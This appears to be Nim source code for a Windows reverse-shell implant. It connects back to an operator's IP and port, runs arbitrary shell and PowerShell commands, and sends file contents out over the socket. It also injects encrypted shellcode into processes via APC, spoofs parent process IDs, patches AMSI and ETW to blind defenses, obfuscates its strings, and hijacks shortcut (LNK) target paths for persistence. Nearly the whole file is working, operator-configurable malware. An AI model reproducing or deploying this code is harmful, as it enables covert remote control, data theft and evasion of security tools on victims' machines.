#[
  - OPTIONS:
      SC injection:
        convert.exe sc.bin
        [LP_SHELL] > inject C:\\Windows\\notepad.exe ZmM0ODgxZTRmMGZmZm[..snip..]MjJlNjQ2YzZjMDA=

      Start a PPID spoofed process:
        [LP_SHELL] > start_proc C:\\Windows\\implant.exe 
      
      Execute PowerShell commands via referencing the System.Management.Automation assembly DLL directory:
        [LP_Shell] > pwsh <commands>
      
      Attempt to patch AMSI and ETW:
        [LP_Shell] > patch
  
  [!] Type 'exit' for a clean exit and shutdown of the connection and process.
  [!] Type 'exit_persist' to exit and set all the target paths to the revshell.
  [!] Change the config data at the top of the file. 

  [i] Once the connection is closed the LNK files will have the target path set to this binary
  [i] The original target paths will be set back to their indended immediatley at launch
]#

import core/static_strs 
import core/patches
import core/rc_for
import core/lnks
from core/injection import remApcInj 
from core/processes import startProc 
from core/util import getFullPath, toByteSeq, convertSeconds

import os 
import nimvoke/dinvoke 
from streams import atEnd, readLine
from base64 import decode 
from osproc import startProcess, poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon, outputStream
from strutils import parseInt, parseFloat, splitWhitespace, startsWith, strip, join

from winim/lean import NTSTATUS, BOOLEAN, LARGE_INTEGER, WINBOOL, LPCSTR, NULL, FALSE, HANDLE, 
                       ERROR_ALREADY_EXISTS, LPSECURITY_ATTRIBUTES, GetLastError, CloseHandle
import winim/clr except `[]`


#[ Edit this ]#
let
  portStr: string = jam("8080")
  ipAddr: string = jam("10.0.0.5")
  key: string = jam("qwerty123") # key for sc
  timeToDelay: int = 20 # execution delay in seconds
  mutexName: string = jam("Global\\qwerty123")
  parentProc: string = jam("explorer.exe")
  revShellPath: string = getAppFilename()

const 
  AF_INET = 2
  SOCK_STREAM = 1
  SOCKET_ERROR = -1
  IPPROTO_TCP = 6
  WSADESCRIPTION_LEN = 256
  WSASYS_STATUS_LEN = 128

type
  WSADATA {.pure.} = object
    wVersion*: WORD
    wHighVersion*: WORD
    iMaxSockets*: uint16
    iMaxUdpDg*: uint16
    lpVendorInfo*: ptr char
    szDescription*: array[WSADESCRIPTION_LEN+1, char]
    szSystemStatus*: array[WSASYS_STATUS_LEN+1, char]

type
  hostent {.pure.} = object
    h_name: ptr char 
    h_aliases: ptr ptr char 
    h_addrtype: int16 
    h_length: int16 
    h_addr_list: ptr ptr char

type
  SOCKET = int
  sockaddr {.pure.} = object
  IN_ADDR {.pure.} = object 
    S_addr: int32
  sockaddr_in {.pure.} = object
    sin_family: int16 
    sin_port: uint16 
    sin_addr: IN_ADDR 
    sin_zero: array[8, char]
  PSOCKADDR = ptr sockaddr
  LPWSADATA = ptr WSADATA

const 
  INVALID_SOCKET = SOCKET(-1)

var
  hMutex: HANDLE
  status: NTSTATUS
  alertable: BOOLEAN = 0
  delayInterval: LARGE_INTEGER 

dinvokeDefine(
  NtDelayExecution,
  "ntdll.dll",
  proc (Alertable: BOOLEAN, DelayInterval: ptr LARGE_INTEGER): NTSTATUS {.stdcall.}
)

delayInterval.QuadPart = -convertSeconds(timeToDelay) 

dinvokeDefine(
  CreateMutexA, 
  "kernel32.dll",
  proc (lpMutexAttributes: LPSECURITY_ATTRIBUTES,
        bInitialOwner: WINBOOL,
        lpName: LPCSTR): HANDLE {.stdcall.}
)

#[ Check if running ]#
proc checkMtx(): bool = 
  hMutex = CreateMutexA(NULL, FALSE, mutexName.cstring)
  if GetLastError() == ERROR_ALREADY_EXISTS:
    return false 
  return true 

if not checkMtx():
  restoreOrigLnkPaths()
  status = NtDelayExecution(alertable, addr(delayInterval))
  modifyAllLnkPaths(revShellPath)
  CloseHandle(hMutex)
  quit(QuitSuccess)

#[ Restore the original target paths ]#
restoreOrigLnkPaths()
status = NtDelayExecution(alertable, addr(delayInterval))

#[ User should be able to open intended file/program etc. ]#

#[ Get Winsock ]#
dinvokeDefine(WSAStartup, "ws2_32.dll", proc (wVersionRequired: WORD, lpWSAData: LPWSADATA): int32 {.stdcall.})
dinvokeDefine(WSACleanup, "ws2_32.dll", proc (): int32 {.stdcall.})
dinvokeDefine(socket, "ws2_32.dll", proc (af: int32, `type`: int32, protocol: int32): SOCKET {.stdcall.})
dinvokeDefine(closesocket, "ws2_32.dll", proc (s: SOCKET): int32 {.stdcall.})
dinvokeDefine(htons, "ws2_32.dll", proc (hostshort: uint16): uint16 {.stdcall.})
dinvokeDefine(inet_addr, "ws2_32.dll", proc (cp: ptr char): int32 {.stdcall.})
dinvokeDefine(gethostbyname, "ws2_32.dll", proc (name: ptr char): ptr hostent {.stdcall.})
dinvokeDefine(connect, "ws2_32.dll", proc (s: SOCKET, name: ptr sockaddr, namelen: int32): int32 {.stdcall.})
dinvokeDefine(recv, "ws2_32.dll", proc (s: SOCKET, buf: ptr char, len: int32, flags: int32): int32 {.stdcall.})
dinvokeDefine(send, "ws2_32.dll", proc (s: SOCKET, buf: ptr char, len: int32, flags: int32): int32 {.stdcall.})

#[ Taken from https://github.com/chvancooten/NimPlant/blob/main/client/commands/risky/powershell.nim ]#
#[ Run PS commands directly via the System.Management.Automation assembly without calling/spawning powershell.exe ]#
proc execPowershell(psCmd: string): string =
  let 
    Automation = load(jam("System.Management.Automation"))
    RunspaceFactory = Automation.GetType(jam("System.Management.Automation.Runspaces.RunspaceFactory"))
  
  var 
    runspace = @RunspaceFactory.CreateRunspace()
    pipeline = runspace.CreatePipeline()
    result = ""

  runspace.Open()
  pipeline.Commands.AddScript(psCmd)
  pipeline.Commands.Add(jam("Out-String"))

  var pipeOut = pipeline.Invoke()
  for i in countUp(0, pipeOut.Count() - 1):
    result.add($pipeOut.Item(i))
  
  runspace.Dispose()
  return result

#[ Setup and connect back ]#
var wsaData: WSAData
if WSAStartup(0x0202, addr wsaData) != 0:
  modifyAllLnkPaths(revShellPath)
  CloseHandle(hMutex)
  quit(QuitFailure)

var sock: SOCKET = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
if sock == INVALID_SOCKET:
  discard WSACleanup()
  modifyAllLnkPaths(revShellPath)
  CloseHandle(hMutex)
  quit(QuitFailure)

let port: int = portStr.parseInt()
var serverAddr: sockaddr_in
serverAddr.sin_family = AF_INET
serverAddr.sin_port = htons(uint16(port))
serverAddr.sin_addr.S_addr = inet_addr(ipAddr.cstring)

if connect(sock, cast[PSOCKADDR](addr serverAddr), sizeof(serverAddr).cint) == SOCKETERROR:
  discard closesocket(sock)
  discard WSACleanup()
  modifyAllLnkPaths(revShellPath)
  CloseHandle(hMutex)
  quit(QuitFailure)

#[ CMDs and Menu ]#
let
  base: string = jam("C:\\")
  prompt: string = jam("[LP_SHELL] > ")
  ipMsg: string = jam("[>] Connected to: ")

let menuStrs: array[9, string] = [
  jam("\n----------------------------------------------------------------------------------\n"),
  jam("[!] Type 'exit' to exit and stop the process without resetting target paths on shortcuts.\n"),
  jam("[!] Type 'exit_persist' to exit and set the target paths back to this binary.\n"),
  jam("----------------------------------------------------------------------------------\n\n"),
  jam("[+] Type 'inject [binary path] [shellcode]' for remote shellcode injection.\n"),
  jam("[+] Type 'start_proc [binary path]' to start a PPID spoofed process.\n"),
  jam("[+] Type 'pwsh [commands]' to execute powershell without calling powershell.exe.\n"),
  jam("[+] Type 'patch' to patch AmsiScanBuffer and EtwEventWrite.\n"),
  jam("[+] Type '?' to print this message again.\n\n")]

let
  cd: string = jam("cd")
  dir: string = jam("dir")
  typeF: string = jam("type")
  exit: string = jam("exit")
  exitP: string = jam("exit_persist")
  inj: string = jam("inject")
  pwsh: string = jam("pwsh")
  patch: string = jam("patch")
  startProc: string = jam("start_proc")
  qMark: string = jam("?")

let 
  fileLabel = jam("[FILE] ")
  dirLabel = jam("[DIR] ")
  lnkFileLabel = jam("[FILE LNK] ")
  lnkDirLabel = jam("[DIR LNK] ")

#[ Send over information ]#
var szBuf: array[1024, char]
let host = cast[ptr hostent](gethostbyname(cast[cstring](addr szBuf[0])))
let inAddr = cast[ptr array[4, uint8]](host.h_addr_list[])
let localIP = $inAddr[0] & "." & $inAddr[1] & "." & $inAddr[2] & "." & $inAddr[3]

let conMsg: string = "\n\n" & ipMsg & localIP & "\n"
discard send(sock, cast[ptr char](cstring(conMsg)), conMsg.len.cint, 0.cint)
for ms in menuStrs:
  discard send(sock, cast[ptr char](cstring(ms)), ms.len.cint, 0.cint)

#[ Main routine ]#
var recvBuf = newString(8192)

while true:
  discard send(sock, cast[ptr char](cstring(prompt)), prompt.len.cint, 0.cint)
  let recvLen = recv(sock, addr recvBuf[0], recvBuf.len.cint, 0)
  let cmd = recvBuf[0 .. recvLen-1].strip()

  if cmd.len > 0:
    #[ Change directories ]#
    if cmd.strip() == cd:
      setCurrentDir(base)

    elif cmd.strip().startsWith(cd):
      let dir = cmd.substr(len(cd)).strip()
      try:
        setCurrentDir(dir)
      except OSError as err:
        let errMsg: string = jam("[X] Error: could not change to: ") & dir & " : " & err.msg & "\n"
        discard send(sock, cast[ptr char](cstring(errMsg)), errMsg.len.cint, 0.cint)
        continue
    
    #[ Get directory listing and filetypes ]#
    elif cmd.strip().startsWith(dir):
      let dirPath: string = cmd.subStr(len(dir)).strip()
      var
        listRes: string
        effectivePath = if dirPath.len == 0: "." else: dirPath

      for kind, path in walkDir(effectivePath):
        case kind:
          of pcFile:
            listRes.add(fileLabel & path & "\n")
          of pcDir:
            listRes.add(dirLabel & path & "\n")
          of pcLinkToFile:
            listRes.add(lnkFileLabel & path & "\n")
          of pcLinkToDir:
            listRes.add(lnkDirLabel & path & "\n")

      discard send(sock, cast[ptr char](cstring(listRes)), listRes.len.cint, 0.cint)

    elif cmd.strip().startsWith(typeF):
      let targetFile: string = cmd.subStr(len(typeF)).strip()
      if targetFile == "": 
        continue
      else:
        try:
          let fileData = readFile(targetFile)
          const chunkSize = 8192 
          var offset = 0 

          while offset < fileData.len:
            let endIdx = min(offset + chunkSize, fileData.len)
            let chunk = fileData.subStr(offset, endIdx - 1)
            discard send(sock, cast[ptr char](cstring(chunk)), chunk.len.cint, 0.cint)
            offset = endIdx 
        except:
          var typeErr: string = jam("[!] Error on cat/type of selected file\n")
          discard send(sock, cast[ptr char](cstring(typeErr)), typeErr.len.cint, 0.cint)
          continue 
    
    #[ Remote APC injection ]#
    elif cmd.strip().startsWith(inj):
      let injInput: string = cmd.subStr(len(inj)).strip()
      let parts = injInput.splitWhitespace()

      let 
        binPath = parts[0]
        encodedSC = parts[1..^1].join(" ")
      
      var decodedSC: string = decode(encodedSC)
      var decryptedSC = frcDec(key, decodedSC)
      var uShellCode: seq[byte] = toByteSeq(decryptedSC)
      remApcInj(uShellCode, binPath, parentProc)
      continue 
    
    #[ Start a PPID spoofed process ]#
    elif cmd.strip().startsWith(start_proc):
      let binPath: string = cmd.subStr(len(start_proc)).strip()
      let (path, name, ext) = splitFile(binPath)
      let file = name & ext
      startProc(path, file, parentProc)
      continue 
    
    #[ PS execution ]#
    elif cmd.strip().startsWith(pwsh):
      let psCmd: string = cmd.subStr(len(pwsh)).strip()
      let psOutput: string = execPowershell(psCmd)
      discard send(sock, cast[ptr char](cstring(psOutput)), psOutput.len.cint, 0.cint)
    
    #[ AMSI/ETW patching ]#
    elif cmd.strip().startsWith(patch):
      let amsiRes: int = patchASB()
      let etwRes: int = patchEEW()
      
      if amsiRes == 0:
        let amsiSuccess: string = jam("[*] AMSI patched!")
        discard send(sock, cast[ptr char](cstring(amsiSuccess)), amsiSuccess.len.cint, 0.cint)
      else:
        let amsiFail: string = jam("[X] AMSI patch failed")
        discard send(sock, cast[ptr char](cstring(amsiFail)), amsiFail.len.cint, 0.cint)
      
      if etwRes == 0:
        let etwSuccess: string = jam("[*] ETW patched!")
        discard send(sock, cast[ptr char](cstring(etwSuccess)), etwSuccess.len.cint, 0.cint)
      else:
        let etwFail: string = jam("[X] ETW patch failed")
        discard send(sock, cast[ptr char](cstring(etwFail)), etwFail.len.cint, 0.cint)
      continue

    #[ Print menu ]#
    elif cmd.strip().startsWith(qMark):
      for ms in menuStrs:
        discard send(sock, cast[ptr char](cstring(ms)), ms.len.cint, 0.cint)
    
    #[ Exit and set target paths to self ]#
    elif cmd.strip().startsWith(exitP):
      discard closesocket(sock)
      discard WSACleanup()
      modifyAllLnkPaths(revShellPath)
      CloseHandle(hMutex)
      quit(QuitSuccess)

    #[ Cleanup and exit keeping target paths as intended ]#
    elif cmd.strip().startsWith(exit):
      discard closesocket(sock)
      discard WSACleanup()
      CloseHandle(hMutex)
      quit(QuitSuccess)
    
    #[ Default cmd exec ]#
    else:
      let process = startProcess(cmd, options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
      #defer: process.close()

      var execRes = "" 
      if process.outputStream != nil:
        while not process.outputStream.atEnd():
          execRes.add(process.outputStream.readLine())
          execRes.add("\n")
      discard send(sock, cast[ptr char](cstring(execRes)), execRes.len.cint, 0.cint)

#[ Exit and set target paths back to self ]#
discard closesocket(sock)
discard WSACleanup()
modifyAllLnkPaths(revShellPath)
CloseHandle(hMutex)
quit(QuitSuccess)
